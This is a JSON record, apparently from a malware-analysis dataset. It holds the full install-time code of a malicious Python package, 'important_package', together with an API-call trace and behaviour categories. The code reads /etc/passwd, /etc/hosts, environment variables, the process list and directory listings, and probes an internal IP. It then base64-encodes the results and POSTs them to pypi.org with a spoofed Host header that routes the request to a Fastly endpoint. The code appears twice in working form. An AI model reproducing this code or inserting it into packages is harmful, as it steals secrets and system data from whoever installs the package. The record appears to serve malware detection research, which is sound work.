[
  {
    "pyfile": "__init__.py",
    "code_snippet": "from urllib import request\nimport json\nimport os\nimport socket\nimport base64\n\ndef try_call(func, *args):\n    try:\n        return func(*args)\n    except:\n        return 'err'\n\npwd = \"\"\ntry:\n    pwd = '\\n'.join([x for x in open(\"/etc/passwd\")])\nexcept:\n    pass\n\nenv = \"\"\ntry:\n    for a in os.environ:\n        env += \"{}={}\".format(a, os.getenv(a))\nexcept:\n    pass\n\npotentialip = \"\"\nfrom socket import timeout\ntry:\n    r = request.Request(\"http://10.204.9.230:80\")\n    potentialip = request.urlopen(r, timeout = 5).read().decode('utf-8')\nexcept Exception as e:\n    pass\n\ndirs = \"\"\ntry:\n    dirs = '\\n'.join(os.listdir())\nexcept:\n    pass\n\nlog = \"\"\ntry:\n    log = '\\n'.join([x for x in open(\"logger.py\")])\nexcept:\n    pass\n\nhosts = \"\"\ntry:\n    hosts = '\\n'.join([x for x in open(\"/etc/hosts\")])\nexcept:\n    pass\n\nprocesses  = \"\"\ntry:\n    processes = [(int(p), c) for p, c in [x.rstrip('\\n').split(' ', 1) \\\n        for x in os.popen('ps h -eo pid:1,command')]]\nexcept:\n    pass\n\nallfiles = \"\"\ntry:\n    allfiles = [os.path.join(dp, f) for dp, dn, fn in os.walk(os.path.expanduser(\"~\")) for f in fn]\nexcept:\n    pass\nallfiles = \"\"\n\nraspfiles = \"\"\ntry:\n    raspfiles = [os.path.join(dp, f) for dp, dn, fn in os.walk(\"/rasp\") for f in fn]\nexcept:\n    pass\n\ndata = {\n    'host' : try_call(os.uname),\n    'd' : try_call(os.path.expanduser, '~'),\n    'ev' : env,\n    'pwd' : pwd,\n    'dirs' : dirs,\n    'log' : log,\n    'hosts' : hosts,\n    'ip' : potentialip,\n    'ps' : processes,\n    'all' : allfiles,\n    'raspfiles' : raspfiles,\n    'c' : try_call(os.getcwd)\n}\ndata = json.dumps(data)\nencoded = base64.urlsafe_b64encode(data.encode(\"utf-8\"))\n\nr = request.Request('https://pypi.org/reqs?d=', data = encoded, headers={'Host': 'psec.forward.io.global.prod.fastly.net'})\nk = request.urlopen(r)\nprint(k)",
    "pattern_analysis": {
      "api_sequence": [
        "open",
        "os.environ",
        "os.getenv",
        "request.Request",
        "request.urlopen",
        "request.urlopen.read",
        "os.listdir",
        "open",
        "open",
        "os.popen",
        "os.walk",
        "os.path.expanduser",
        "os.path.join",
        "os.walk",
        "os.path.join",
        "os.uname",
        "os.path.expanduser",
        "os.getcwd",
        "json.dumps",
        "base64.urlsafe_b64encode",
        "request.Request",
        "request.urlopen",
        "print"
      ],
      "api_sequence_with_args": [
        "open(\"/etc/passwd\")",
        "os.environ",
        "os.getenv(a)",
        "request.Request(\"http://10.204.9.230:80\")",
        "request.urlopen(r, timeout=5)",
        "request.urlopen(r, timeout=5).read()",
        "os.listdir()",
        "open(\"logger.py\")",
        "open(\"/etc/hosts\")",
        "os.popen('ps h -eo pid:1,command')",
        "os.walk(os.path.expanduser(\"~\"))",
        "os.path.expanduser(\"~\")",
        "os.path.join(dp, f)",
        "os.walk(\"/rasp\")",
        "os.path.join(dp, f)",
        "os.uname()",
        "os.path.expanduser('~')",
        "os.getcwd()",
        "json.dumps(data)",
        "base64.urlsafe_b64encode(data.encode(\"utf-8\"))",
        "request.Request('https://pypi.org/reqs?d=', data=encoded, headers={'Host': 'psec.forward.io.global.prod.fastly.net'})",
        "request.urlopen(r)",
        "print(k)"
      ],
      "mapped_sequence": [
        {
          "api_name": "open",
          "id": "basic_read_operations",
          "description": "ic file opening operations for reading (normal reading, binary reading)",
          "first_id": "file_operations",
          "second_id": "file_reading_writing",
          "third_id": "file_opening"
        },
        {
          "api_name": "os.environ",
          "id": "get_env_vars",
          "description": "Retrieves environment variables mapping",
          "first_id": "system_operations",
          "second_id": "system_environment_operations",
          "third_id": "environment_information"
        },
        {
          "api_name": "os.getenv",
          "id": "get_env_var",
          "description": "Retrieves value of environment variable",
          "first_id": "system_operations",
          "second_id": "system_environment_operations",
          "third_id": "environment_information"
        },
        {
          "api_name": "urllib.request.Request",
          "id": "create_http_request",
          "description": "Creates HTTP request object with specified URL, data, and headers",
          "first_id": "basic_network_operations",
          "second_id": "http_requests",
          "third_id": "request_creation"
        },
        {
          "api_name": "urllib.request.urlopen",
          "id": "open_url_get_timeout",
          "description": "Opens URL with GET parameters and timeout",
          "first_id": "basic_network_operations",
          "second_id": "http_requests",
          "third_id": "request_sending"
        },
        {
          "api_name": "http.client.HTTPResponse.read",
          "id": "read_response_body",
          "description": "Reads response body from HTTP response",
          "first_id": "basic_network_operations",
          "second_id": "http_requests",
          "third_id": "response_processing"
        },
        {
          "api_name": "os.listdir",
          "id": "list_files_directories",
          "description": "Lists files and directories in specified path",
          "first_id": "file_operations",
          "second_id": "file_management",
          "third_id": "directory_operations"
        },
        {
          "api_name": "open",
          "id": "basic_read_operations",
          "description": "ic file opening operations for reading (normal reading, binary reading)",
          "first_id": "file_operations",
          "second_id": "file_reading_writing",
          "third_id": "file_opening"
        },
        {
          "api_name": "open",
          "id": "basic_read_operations",
          "description": "ic file opening operations for reading (normal reading, binary reading)",
          "first_id": "file_operations",
          "second_id": "file_reading_writing",
          "third_id": "file_opening"
        },
        {
          "api_name": "os.popen",
          "id": "execute_shell_command",
          "description": "Executes shell command",
          "first_id": "command_control_communications",
          "second_id": "command_execution",
          "third_id": "command_sending"
        },
        {
          "api_name": "os.walk",
          "id": "list_files_directories",
          "description": "Lists files and directories in specified path",
          "first_id": "file_operations",
          "second_id": "file_management",
          "third_id": "directory_operations"
        },
        {
          "api_name": "os.path.expanduser",
          "id": "path_special_operations",
          "description": "Special path operations (home directory expansion, temporary directory path, executable path, directory tree generation)",
          "first_id": "file_operations",
          "second_id": "file_management",
          "third_id": "file_path_operations"
        },
        {
          "api_name": "os.path.join",
          "id": "path_string_operations",
          "description": "Basic path string operations (getting absolute path, base name, parent directory, splitting and joining paths)",
          "first_id": "file_operations",
          "second_id": "file_management",
          "third_id": "file_path_operations"
        },
        {
          "api_name": "os.walk",
          "id": "list_files_directories",
          "description": "Lists files and directories in specified path",
          "first_id": "file_operations",
          "second_id": "file_management",
          "third_id": "directory_operations"
        },
        {
          "api_name": "os.path.join",
          "id": "path_string_operations",
          "description": "Basic path string operations (getting absolute path, base name, parent directory, splitting and joining paths)",
          "first_id": "file_operations",
          "second_id": "file_management",
          "third_id": "file_path_operations"
        },
        {
          "api_name": "os.uname",
          "id": "get_os_info",
          "description": "Retrieves operating system information",
          "first_id": "information_gathering",
          "second_id": "system_information_collection",
          "third_id": "os_information"
        },
        {
          "api_name": "os.path.expanduser",
          "id": "path_special_operations",
          "description": "Special path operations (home directory expansion, temporary directory path, executable path, directory tree generation)",
          "first_id": "file_operations",
          "second_id": "file_management",
          "third_id": "file_path_operations"
        },
        {
          "api_name": "os.getcwd",
          "id": "get_working_dir",
          "description": "Returns current working directory",
          "first_id": "system_operations",
          "second_id": "system_environment_operations",
          "third_id": "environment_information"
        },
        {
          "api_name": "json.dumps",
          "id": "serialize_to_json",
          "description": "Serializes Python object to JSON string",
          "first_id": "data_transformation_processing",
          "second_id": "data_encoding",
          "third_id": "specific_format_encoding"
        },
        {
          "api_name": "base64.urlsafe_b64encode",
          "id": "encode_bytes_to_base64",
          "description": "Encodes bytes to base64-encoded bytes",
          "first_id": "data_transformation_processing",
          "second_id": "data_encoding",
          "third_id": "base_encoding"
        },
        {
          "api_name": "urllib.request.Request",
          "id": "create_http_request",
          "description": "Creates HTTP request object with specified URL, data, and headers",
          "first_id": "basic_network_operations",
          "second_id": "http_requests",
          "third_id": "request_creation"
        },
        {
          "api_name": "urllib.request.urlopen",
          "id": "open_url_post",
          "description": "Opens URL with POST data",
          "first_id": "basic_network_operations",
          "second_id": "http_requests",
          "third_id": "request_sending"
        },
        {
          "api_name": "print",
          "id": "log_info",
          "description": "Logs informational message",
          "first_id": "data_exfiltration",
          "second_id": "data_collection_operations",
          "third_id": "data_acquisition"
        }
      ],
      "contextual_code": "from urllib import request\nimport json\nimport os\nimport socket\nimport base64\n\ndef try_call(func, *args):\n    try:\n        return func(*args)\n    except:\n        return 'err'\n\n# Read /etc/passwd\ntry:\n    pwd = '\\n'.join([x for x in open(\"/etc/passwd\")])\nexcept:\n    pwd = \"\"\n\n# Read environment variables\ntry:\n    env = \"\"\n    for a in os.environ:\n        env += \"{}={}\".format(a, os.getenv(a))\nexcept:\n    env = \"\"\n\n# HTTP GET to internal IP, read and decode response\ntry:\n    r = request.Request(\"http://10.204.9.230:80\")\n    potentialip = request.urlopen(r, timeout = 5).read().decode('utf-8')\nexcept Exception as e:\n    potentialip = \"\"\n\n# List current directory\ntry:\n    dirs = '\\n'.join(os.listdir())\nexcept:\n    dirs = \"\"\n\n# Read logger.py\ntry:\n    log = '\\n'.join([x for x in open(\"logger.py\")])\nexcept:\n    log = \"\"\n\n# Read /etc/hosts\ntry:\n    hosts = '\\n'.join([x for x in open(\"/etc/hosts\")])\nexcept:\n    hosts = \"\"\n\n# List processes using shell command\ntry:\n    processes = [(int(p), c) for p, c in [x.rstrip('\\n').split(' ', 1) for x in os.popen('ps h -eo pid:1,command')]]\nexcept:\n    processes = \"\"\n\n# List all files in home directory\ntry:\n    allfiles = [os.path.join(dp, f) for dp, dn, fn in os.walk(os.path.expanduser(\"~\")) for f in fn]\nexcept:\n    allfiles = \"\"\n\n# List all files in /rasp\ntry:\n    raspfiles = [os.path.join(dp, f) for dp, dn, fn in os.walk(\"/rasp\") for f in fn]\nexcept:\n    raspfiles = \"\"\n\ndata = {\n    'host' : try_call(os.uname),\n    'd' : try_call(os.path.expanduser, '~'),\n    'ev' : env,\n    'pwd' : pwd,\n    'dirs' : dirs,\n    'log' : log,\n    'hosts' : hosts,\n    'ip' : potentialip,\n    'ps' : processes,\n    'all' : allfiles,\n    'raspfiles' : raspfiles,\n    'c' : try_call(os.getcwd)\n}\ndata = json.dumps(data)\nencoded = base64.urlsafe_b64encode(data.encode(\"utf-8\"))\n\nr = request.Request('https://pypi.org/reqs?d=', data = encoded, headers={'Host': 'psec.forward.io.global.prod.fastly.net'})\nk = request.urlopen(r)\nprint(k)"
    }
  },
  {
    "metadata": {
      "package_name": "important_package-0.1.15"
    }
  }
]